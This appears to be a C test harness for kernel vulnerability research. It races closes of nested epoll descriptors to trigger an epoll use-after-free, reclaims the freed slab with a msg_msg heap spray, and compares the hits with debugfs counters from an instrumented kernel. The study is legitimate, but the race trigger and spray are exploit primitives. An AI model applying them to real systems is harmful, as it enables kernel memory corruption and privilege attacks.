// test_hyp002.c — HYP-002: Kernel-Side Debugfs Counter Ground-Truth Test
// Compares kernel UAF counters (debugfs) vs userspace oracle (msg_msg integrity)
// Experiment: Does the natural race fire silently without the oracle detecting it?
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/epoll.h>
#include <fcntl.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <string.h>
#include <time.h>
#include <sys/reboot.h>
#include <sys/mount.h>
#include <sys/stat.h>

#define ITERATIONS       5000
#define MSG_PAYLOAD_SIZE 144   /* 48B header + 144B user = 192B → kmalloc-192 */
#define SPRAY_COUNT      200
#define MARKER_BYTE      0x42

// ── Shared state ──
static atomic_int sync_go = 0;
static atomic_int ready_a = 0, ready_b = 0;
static int ep_outer = -1;
static int ep_inner = -1;
static atomic_long oracle_hits = 0;

// ── Debugfs paths ──
#define DEBUGFS_BASE "/sys/kernel/debug/epoll_uaf/"
#define DEBUGFS_FEP  DEBUGFS_BASE "fep_cleared"
#define DEBUGFS_UAF  DEBUGFS_BASE "uaf_detected"
#define DEBUGFS_FREE DEBUGFS_BASE "epfree_called"
#define DEBUGFS_RST  DEBUGFS_BASE "reset"

static void print_msg(const char *msg) {
    write(1, msg, strlen(msg));
}

static long read_debugfs_counter(const char *path) {
    char buf[64] = {0};
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return strtol(buf, NULL, 10);
}

static void reset_debugfs_counters(void) {
    int fd = open(DEBUGFS_RST, O_WRONLY);
    if (fd >= 0) {
        write(fd, "1", 1);
        close(fd);
    }
}

// ── Thread A: close(outer) → triggers __ep_remove(outer, epi) for inner file ──
void *thread_a(void *arg) {
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(0, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    atomic_store(&ready_a, 1);
    while (!atomic_load(&sync_go)) { __asm__ volatile("yield"); }

    close(ep_outer);
    return NULL;
}

// ── Thread B: close(inner) → eventpoll_release fast path → ep_free(inner_ep) ──
void *thread_b(void *arg) {
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(1, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    atomic_store(&ready_b, 1);
    while (!atomic_load(&sync_go)) { __asm__ volatile("yield"); }

    close(ep_inner);

    // Spray msg_msg to reclaim freed inner_ep in kmalloc-192
    int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msqid >= 0) {
        struct { long mtype; char mtext[MSG_PAYLOAD_SIZE]; } msg = { .mtype = 1 };
        memset(msg.mtext, MARKER_BYTE, MSG_PAYLOAD_SIZE);
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (msgsnd(msqid, &msg, MSG_PAYLOAD_SIZE, IPC_NOWAIT) < 0) break;
        }
        // Oracle: check if any sprayed msg_msg had its byte 112 (offset 160)
        // corrupted by hlist_del_rcu writing NULL
        struct { long mtype; char mtext[MSG_PAYLOAD_SIZE]; } rx_msg;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (msgrcv(msqid, &rx_msg, MSG_PAYLOAD_SIZE, 0, IPC_NOWAIT) <= 0) break;
            for (int k = 0; k < MSG_PAYLOAD_SIZE; k++) {
                if ((unsigned char)rx_msg.mtext[k] != MARKER_BYTE) {
                    atomic_fetch_add(&oracle_hits, 1);
                    break;
                }
            }
        }
        msgctl(msqid, IPC_RMID, NULL);
    }
    return NULL;
}

static int run_trial(void) {
    atomic_store(&sync_go, 0);
    atomic_store(&ready_a, 0);
    atomic_store(&ready_b, 0);

    ep_outer = epoll_create1(0);
    ep_inner = epoll_create1(0);
    if (ep_outer < 0 || ep_inner < 0) return -1;

    // outer watches inner (nested epoll topology)
    struct epoll_event ev = { .events = EPOLLIN, .data.fd = ep_inner };
    if (epoll_ctl(ep_outer, EPOLL_CTL_ADD, ep_inner, &ev) < 0) {
        close(ep_outer); close(ep_inner);
        return -1;
    }

    pthread_t ta, tb;
    pthread_create(&ta, NULL, thread_a, NULL);
    pthread_create(&tb, NULL, thread_b, NULL);

    // Wait for both threads to be ready
    while (!atomic_load(&ready_a) || !atomic_load(&ready_b)) { usleep(1); }

    // Fire!
    atomic_store(&sync_go, 1);

    pthread_join(ta, NULL);
    pthread_join(tb, NULL);

    return 0;
}

int main(void) {
    char buf[512];

    print_msg("=== HYP-002: Kernel-Side Debugfs Counter Ground-Truth Test ===\n");

    // Mount debugfs
    mkdir("/sys/kernel/debug", 0755);
    if (mount("debugfs", "/sys/kernel/debug", "debugfs", 0, NULL) < 0) {
        print_msg("[!] WARNING: Failed to mount debugfs. Kernel counters unavailable.\n");
    }

    // Verify debugfs interface
    long test_val = read_debugfs_counter(DEBUGFS_FEP);
    if (test_val < 0) {
        print_msg("[!] ERROR: Cannot read debugfs counter. Kernel patch not applied?\n");
        print_msg("[!] Proceeding with oracle-only mode.\n");
    } else {
        print_msg("[*] Debugfs interface verified: /sys/kernel/debug/epoll_uaf/\n");
        reset_debugfs_counters();
        print_msg("[*] Counters reset to zero.\n");
    }

    // Run trials
    snprintf(buf, sizeof(buf), "[*] Starting %d race iterations...\n", ITERATIONS);
    print_msg(buf);

    int failed = 0;
    for (int i = 0; i < ITERATIONS; i++) {
        if (run_trial() < 0) {
            failed++;
        }

        // Progress every 500 iterations
        if ((i + 1) % 500 == 0) {
            long fep = read_debugfs_counter(DEBUGFS_FEP);
            long uaf = read_debugfs_counter(DEBUGFS_UAF);
            snprintf(buf, sizeof(buf),
                     "[*] Progress: %d/%d | kernel_fep_cleared=%ld | kernel_uaf=%ld | oracle=%ld | setup_fail=%d\n",
                     i + 1, ITERATIONS, fep, uaf, atomic_load(&oracle_hits), failed);
            print_msg(buf);
        }
    }

    // Read final kernel counters
    long final_fep   = read_debugfs_counter(DEBUGFS_FEP);
    long final_uaf   = read_debugfs_counter(DEBUGFS_UAF);
    long final_free  = read_debugfs_counter(DEBUGFS_FREE);
    long final_oracle = atomic_load(&oracle_hits);

    print_msg("\n========================================\n");
    print_msg("HYP-002 FINAL RESULTS\n");
    print_msg("========================================\n");
    snprintf(buf, sizeof(buf),
             "Iterations:              %d\n"
             "Setup failures:          %d\n"
             "Kernel fep_cleared:      %ld\n"
             "Kernel uaf_detected:     %ld\n"
             "Kernel epfree_called:    %ld\n"
             "Userspace oracle_hits:   %ld\n",
             ITERATIONS, failed,
             final_fep, final_uaf, final_free, final_oracle);
    print_msg(buf);

    // Interpret results
    if (final_uaf > 0 && final_oracle == 0) {
        print_msg("\n>>> HYPOTHESIS 2 CONFIRMED: Race winning silently!\n");
        print_msg(">>> Kernel detected UAF but oracle missed it.\n");
        print_msg(">>> Action: Fix oracle, re-run full suite.\n");
    } else if (final_uaf == 0 && final_oracle == 0) {
        print_msg("\n>>> HYPOTHESIS 2 REJECTED: Race not firing under QEMU TCG.\n");
        print_msg(">>> Both kernel and oracle agree: 0 hits.\n");
        print_msg(">>> Action: Move to Hypothesis 1 (QEMU timerfd test).\n");
    } else if (final_uaf == 0 && final_oracle > 0) {
        print_msg("\n>>> ANOMALY: Oracle false-positive detected.\n");
        print_msg(">>> Kernel sees no UAF but oracle reports hits.\n");
        print_msg(">>> Action: Investigate oracle logic.\n");
    } else {
        print_msg("\n>>> BOTH DETECTED: Race firing and oracle working.\n");
        snprintf(buf, sizeof(buf),
                 ">>> kernel=%ld oracle=%ld\n", final_uaf, final_oracle);
        print_msg(buf);
    }

    // Sanity checks
    print_msg("\n--- Sanity Checks ---\n");
    if (final_fep == 0) {
        print_msg("[!] WARN: fep_cleared=0 — __ep_remove never cleared f_ep for epoll file.\n");
        print_msg("    This means the single-epitem condition was never met.\n");
        print_msg("    Check harness topology!\n");
    } else {
        snprintf(buf, sizeof(buf),
                 "[OK] fep_cleared=%ld (expected ~%d, one per iteration)\n",
                 final_fep, ITERATIONS);
        print_msg(buf);
    }
    if (final_free == 0) {
        print_msg("[!] WARN: epfree_called=0 — no epolls freed during test.\n");
    } else {
        snprintf(buf, sizeof(buf),
                 "[OK] epfree_called=%ld (expected ~%d, outer+inner per iter)\n",
                 final_free, ITERATIONS * 2);
        print_msg(buf);
    }

    print_msg("========================================\n");
    print_msg("HYP-002 test complete.\n");

    reboot(RB_POWER_OFF);
    return 0;
}
